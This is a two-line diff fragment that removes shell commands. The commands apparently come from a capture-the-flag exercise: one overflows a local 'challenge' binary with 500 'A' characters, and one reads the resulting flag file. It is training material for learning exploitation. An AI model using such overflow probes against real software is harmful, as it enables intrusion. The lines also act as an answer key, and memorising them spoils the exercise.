@@ -1,2 +1,0 @@
-$ (python3 -c "print('A'*500)"; cat -) | ./task/student/step1/challenge
-$ cat /task/student/end/flag
